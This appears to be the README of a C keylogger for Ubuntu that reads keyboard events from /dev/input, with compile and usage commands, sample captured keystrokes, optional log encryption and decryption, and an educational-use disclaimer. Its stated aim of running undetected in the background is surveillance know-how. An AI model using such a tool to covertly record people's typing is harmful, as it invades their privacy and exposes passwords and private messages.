# I2C-keylogger
This project provides a keylogger in C, to log a users keystrokes on a Linux OS.

It should:
1. Run in the background without user detection (with antivirus disabled)
2. Log all keystrokes to a specified file path
3. Include optional encrypting of the log file
4. Run on Ubuntu 24.04
5. Be simple, lightweight and user-friendly

## Disclaimer
This project is intended solely for educational purposes to demonstrate an understanding of programming concepts in the C language. The keylogger implemented as part of this project is designed for legal and ethical use only, specifically within a controlled environment, such as a personal computer with the explicit consent of the owner.

# Usage

## Example usage
```
% gcc keylogger.c -o keylogger -lssl -lcrypto
% ./keylogger -h                             
Usage ./keylogger [-p log-file-path] [-e encryption-key] [-d encrypted-file decrypted-file password] [-h]

Start a keylogger to log all keyboards inputs

Options:
 -p path                      Specify the path to log keystrokes.
 -e encryption-key            Specify a key to encrypt the log file.
 -d encrypted-file output-file password
                              Decrypt an encrypted log file to a specified output file using the password.
 -h                           Print this help message.

% ./keylogger   
Scanning /dev/input/ for keyboard devices...
Skipping non-keyboard device: /dev/input/event0 (Lid Switch)
Skipping non-keyboard device: /dev/input/event1 (Sleep Button)
Skipping non-keyboard device: /dev/input/event2 (Power Button)
Skipping non-keyboard device: /dev/input/event3 (Power Button)
Device recognized as keyboard: /dev/input/event4 (AT Translated Set 2 keyboard)
Valid keyboard device found: /dev/input/event4
Skipping non-keyboard device: /dev/input/event5 (ELAN2513:00 04F3:4035)
Skipping non-keyboard device: /dev/input/event6 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event7 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event8 (ELAN2513:00 04F3:4035 Stylus)
Device recognized as keyboard: /dev/input/event9 (ELAN2513:00 04F3:4035 Keyboard)
Valid keyboard device found: /dev/input/event9
Skipping non-keyboard device: /dev/input/event10 (ELAN2513:00 04F3:4035 Mouse)
Skipping non-keyboard device: /dev/input/event11 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event12 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event13 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event14 (SYNA32C0:00 06CB:CEB0 Mouse)
Skipping non-keyboard device: /dev/input/event15 (SYNA32C0:00 06CB:CEB0 Touchpad)
Skipping non-keyboard device: /dev/input/event16 (Intel HID events)
Skipping non-keyboard device: /dev/input/event17 (Intel HID 5 button array)
Skipping non-keyboard device: /dev/input/event18 (HP WMI hotkeys)
Skipping non-keyboard device: /dev/input/event19 (Intel HID switches)
Skipping non-keyboard device: /dev/input/event20 (Video Bus)
Skipping non-keyboard device: /dev/input/event21 (sof-hda-dsp Mic)
Skipping non-keyboard device: /dev/input/event22 (sof-hda-dsp Headphone)
Skipping non-keyboard device: /dev/input/event23 (sof-hda-dsp HDMI/DP,pcm=3)
Skipping non-keyboard device: /dev/input/event24 (sof-hda-dsp HDMI/DP,pcm=4)
Skipping non-keyboard device: /dev/input/event25 (sof-hda-dsp HDMI/DP,pcm=5)
Logging keystrokes to keylog.txt
asdf^CExiting gracefully...
% cat keylog.txt
A
S
D
F
LEFTCTRL
C
% ./keylogger -p keylog.enc -e mysecret
Scanning /dev/input/ for keyboard devices...
Skipping non-keyboard device: /dev/input/event0 (Lid Switch)
Skipping non-keyboard device: /dev/input/event1 (Sleep Button)
Skipping non-keyboard device: /dev/input/event2 (Power Button)
Skipping non-keyboard device: /dev/input/event3 (Power Button)
Device recognized as keyboard: /dev/input/event4 (AT Translated Set 2 keyboard)
Valid keyboard device found: /dev/input/event4
Skipping non-keyboard device: /dev/input/event5 (ELAN2513:00 04F3:4035)
Skipping non-keyboard device: /dev/input/event6 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event7 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event8 (ELAN2513:00 04F3:4035 Stylus)
Device recognized as keyboard: /dev/input/event9 (ELAN2513:00 04F3:4035 Keyboard)
Valid keyboard device found: /dev/input/event9
Skipping non-keyboard device: /dev/input/event10 (ELAN2513:00 04F3:4035 Mouse)
Skipping non-keyboard device: /dev/input/event11 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event12 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event13 (ELAN2513:00 04F3:4035 UNKNOWN)
Skipping non-keyboard device: /dev/input/event14 (SYNA32C0:00 06CB:CEB0 Mouse)
Skipping non-keyboard device: /dev/input/event15 (SYNA32C0:00 06CB:CEB0 Touchpad)
Skipping non-keyboard device: /dev/input/event16 (Intel HID events)
Skipping non-keyboard device: /dev/input/event17 (Intel HID 5 button array)
Skipping non-keyboard device: /dev/input/event18 (HP WMI hotkeys)
Skipping non-keyboard device: /dev/input/event19 (Intel HID switches)
Skipping non-keyboard device: /dev/input/event20 (Video Bus)
Skipping non-keyboard device: /dev/input/event21 (sof-hda-dsp Mic)
Skipping non-keyboard device: /dev/input/event22 (sof-hda-dsp Headphone)
Skipping non-keyboard device: /dev/input/event23 (sof-hda-dsp HDMI/DP,pcm=3)
Skipping non-keyboard device: /dev/input/event24 (sof-hda-dsp HDMI/DP,pcm=4)
Skipping non-keyboard device: /dev/input/event25 (sof-hda-dsp HDMI/DP,pcm=5)
Logging keystrokes to keylog.enc
asdf^CExiting gracefully...
% hexdump -C keylog.enc          
00000000  53 61 6c 74 65 64 5f 5f  cc 1b 10 bd 61 dc 12 00  |Salted__....a...|
00000010  f2 09 c5 45 ee 9a 07 16  a1 33 a4 b9 1d 76 c3 3c  |...E.....3...v.<|
00000020  ef 79 91 3d e9 35 7d 58  c1 29 a7 15 db 15 92 34  |.y.=.5}X.).....4|
00000030
% ./keylogger -d keylog.enc keylog.dec mysecret
Decrypting file 'keylog.enc' to 'keylog.dec'
Decryption complete.
% cat keylog.dec
A
S
D
F
LEFTCTRL
C
```

## Usage via GUI
The application can also be called via GUI (double-click) and will then run with default options -> write unencrypted log to keylog.txt in the current directory.
The keylog.txt can then be easily followed with the tail command.
To stop the keylogger, you have to kill it.
```
% tail -f keylog.txt                         
ENTER
LEFTCTRL
R
T
A
I
L
SPACE
SLASH
ENTER
A
S
D
F
LEFTCTRL
A
BACKSPACE
LEFTCTRL
C
^C
% killall keylogger   
```
